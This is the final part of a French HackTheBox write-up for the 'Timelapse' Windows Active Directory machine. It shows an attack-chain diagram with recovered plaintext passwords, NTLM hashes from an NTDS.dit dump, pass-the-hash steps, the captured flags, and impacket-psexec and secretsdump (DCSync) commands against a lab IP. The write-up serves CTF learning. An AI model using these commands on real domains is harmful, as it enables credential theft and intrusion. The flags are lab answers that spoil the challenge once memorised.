+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[2] ÉLÉVATION DE PRIVILÈGES
+</span></span><span style="display:flex;"><span>    PowerShell History
+</span></span><span style="display:flex;"><span>    ($env:APPDATA\...\ConsoleHost_history.txt)
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    Credentials en clair:
+</span></span><span style="display:flex;"><span>    svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    ┌──────────────────────────┐
+</span></span><span style="display:flex;"><span>    │  WinRM Password Auth     │
+</span></span><span style="display:flex;"><span>    │  User: svc_deploy        │
+</span></span><span style="display:flex;"><span>    │  Group: LAPS_Readers     │
+</span></span><span style="display:flex;"><span>    └──────────────────────────┘
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[3] ABUS LAPS
+</span></span><span style="display:flex;"><span>    Get-ADComputer -Properties ms-Mcs-AdmPwd
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    Password Administrator:
+</span></span><span style="display:flex;"><span>    I)}73pmp{9+;E2/kWv0LZ7Tt
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    ┌──────────────────────────┐
+</span></span><span style="display:flex;"><span>    │  WinRM Admin Auth        │
+</span></span><span style="display:flex;"><span>    │  User: Administrator     │
+</span></span><span style="display:flex;"><span>    │  (Compte local DC01)     │
+</span></span><span style="display:flex;"><span>    └──────────────────────────┘
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[4] POST-EXPLOITATION
+</span></span><span style="display:flex;"><span>    impacket-secretsdump
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    NTDS.dit dump:
+</span></span><span style="display:flex;"><span>    - Administrator: 22d04d77cc32a59f9fe6701aa9ffafb0
+</span></span><span style="display:flex;"><span>    - krbtgt:        2960d580f05cd511b3da3d3663f3cb37
+</span></span><span style="display:flex;"><span>    - TRX:           4c7121d35cd421cbbd3e44ce83bc923e ⭐
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    Pass-the-Hash (TRX)
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    ┌──────────────────────────┐
+</span></span><span style="display:flex;"><span>    │  Evil-WinRM PTH          │
+</span></span><span style="display:flex;"><span>    │  User: TRX               │
+</span></span><span style="display:flex;"><span>    │  Hash: 4c7121d3...       │
+</span></span><span style="display:flex;"><span>    └──────────────────────────┘
+</span></span><span style="display:flex;"><span>         ↓
+</span></span><span style="display:flex;"><span>    🏁 ROOT FLAG (C:\Users\TRX\Desktop\root.txt)
+</span></span></code></pre></div><hr>
+<h2 id="-flags">🏁 FLAGS<a hidden class="anchor" aria-hidden="true" href="#-flags">#</a></h2>
+<ul>
+<li>
+<p><strong>User Flag :</strong> <code>c5f8ed1478d7f0a3d0ac7403e16b5854</code><br>
+Location: <code>C:\Users\legacyy\Desktop\user.txt</code></p>
+</li>
+<li>
+<p><strong>Root Flag :</strong> <code>6506078077b79f2969f0a0a69fe4eddf</code><br>
+Location: <code>C:\Users\TRX\Desktop\root.txt</code></p>
+</li>
+</ul>
+<hr>
+<h2 id="-notes-finales">📝 NOTES FINALES<a hidden class="anchor" aria-hidden="true" href="#-notes-finales">#</a></h2>
+<p><strong>Pourquoi le root flag est chez TRX et pas Administrator ?</strong></p>
+<p>Cette configuration est intentionnelle par HTB pour enseigner :</p>
+<ol>
+<li>
+<p><strong>Les ACLs Windows ≠ Permissions AD</strong></p>
+<ul>
+<li>Même Domain Admin peut être bloqué par NTFS ACLs</li>
+</ul>
+</li>
+<li>
+<p><strong>Post-exploitation complète nécessaire</strong></p>
+<ul>
+<li>Pas seulement &ldquo;devenir admin&rdquo; → explorer tous les utilisateurs</li>
+</ul>
+</li>
+<li>
+<p><strong>Pass-the-Hash = Technique essentielle</strong></p>
+<ul>
+<li>Mouvement latéral sans mot de passe</li>
+</ul>
+</li>
+</ol>
+<p><strong>Ce qu&rsquo;on aurait pu faire autrement :</strong></p>
+<ol>
+<li><strong>Modifier les ACLs</strong> (mais destructif) :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>takeown /f C:\Users\TRX\Desktop\root.txt
+</span></span><span style="display:flex;"><span>icacls C:\Users\TRX\Desktop\root.txt /grant Administrator<span style="color:#960050;background-color:#1e0010">:</span>F
+</span></span></code></pre></div><ol start="2">
+<li><strong>Utiliser PsExec</strong> avec hash Administrator :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-psexec -hashes :22d04d77cc32a59f9fe6701aa9ffafb0 Administrator@10.10.11.152
+</span></span></code></pre></div><ol start="3">
+<li><strong>DCSync Attack</strong> (extraire tous les hashes via Kerberos) :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump -just-dc-ntlm timelapse.htb/Administrator@10.10.11.152 -hashes :22d04d77cc32a59f9fe6701aa9ffafb0
+</span></span></code></pre></div><hr>
+<p><strong>📅 Terminé le :</strong> 13/12/2025<br>
+<strong>⏱️ Durée :</strong> ~82 minutes<br>
+<strong>✅ Statut :</strong> Pwned<br>
+<strong>🎓 Difficulté :</strong> Easy (mais pédagogique !)</p>
+<hr>
+<p><em>Ce write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/windows/">Windows</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/easy/">Easy</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/active-directory/">Active Directory</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/sorcery/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Sorcery - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/underpass/">
+    <span class="title">Next »</span>
+    <br>
+    <span>UnderPass - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
